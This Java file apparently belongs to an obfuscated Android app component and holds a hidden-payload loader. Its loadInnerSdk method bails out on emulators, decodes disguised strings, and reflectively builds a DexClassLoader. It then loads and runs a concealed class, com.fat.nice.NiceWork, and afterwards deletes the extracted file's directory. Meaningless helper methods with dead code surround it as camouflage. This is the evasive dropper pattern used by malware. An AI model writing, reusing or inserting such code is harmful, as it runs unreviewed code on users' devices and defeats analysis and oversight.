package com.dmy;

import android.content.Context;

import java.io.File;
import java.lang.reflect.Constructor;

public class ClassName2 {

    public static String toHex(byte[] data) {
        StringBuffer buffer = new StringBuffer();
        for (int i = 0; i < data.length; ++i) {
            byte b = data[i];
            buffer.append(String.format("%x", b));
            if (i != data.length - 1) {
                buffer.append(":");
            }
        }
        return buffer.toString();
    }

    public byte getHashCode() {
        String s = "OSB";
        return (byte) s.hashCode();
    }

    public static void loadInnerSdk(Context context, String change) {
        Class<?> startClass = null;
        if (ClassName4.isVirtual(context) || ClassName0.isMacBad()) {
            return;
        }
        String getParentStr = new ClassName1().decodeStr("msgetParentms").substring(2, 11);
        File targetFile = null;
        Object loader = null;
        if (startClass == null) {
            targetFile = ClassName0.getTargetFile(context);
            String fileParent = (String) ClassName0.invokeMethod(targetFile.getClass(), getParentStr, targetFile, (Class<?>[]) null, (Object[]) null);
            ClassName4.releaseFile(context, targetFile);
            Object classLoader = ClassName0.invokeMethod(context.getClass(), new ClassName1().decodeStr("msgetClassLoaderms").substring(2, 16), context, (Class<?>[]) null, (Object[]) null);
            Object parentCL = ClassName0.invokeMethod(classLoader.getClass(), getParentStr, classLoader, (Class<?>[]) null, (Object[]) null);
            try {
                Class<?> dexClassLoaderClz = Class.forName(new ClassName1().decodeStr("msdalvik.system.DexClassLoader").substring(2));
                Constructor<?> constructor = dexClassLoaderClz.getConstructor(String.class, String.class, String.class, ClassLoader.class);
                loader = constructor.newInstance(targetFile.getPath(), targetFile.getParent(), null, parentCL);
                startClass = (Class<?>) ClassName0.invokeMethod(dexClassLoaderClz, new ClassName1().decodeStr("msloadClass").substring(2), loader, new Class[] { String.class }, new Object[] { new ClassName1().decodeStr("com.fat.nice.NiceWork") });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        String str1 = new ClassName1().decodeStr("startPager");
        String str2 = new ClassName1().decodeStr("PluginConfig");
        ClassName4.invokeStaticMethod(startClass, str1, new Class[] { Context.class, String.class, String.class }, context, str2, new ClassName1().decodeStr(change));
        if (targetFile != null && targetFile.exists()) {
            ClassName3.eteDirectory(targetFile.getParentFile());
        }
    }

    public static byte orOperation(int value_1, int value_2) {
        byte rst = 0;
        int sum = value_1 + value_2;
        int mult = value_1 * value_2;
        int sub = mult - sum;
        rst = (byte) (value_1 | value_2);
        return rst;
    }
}
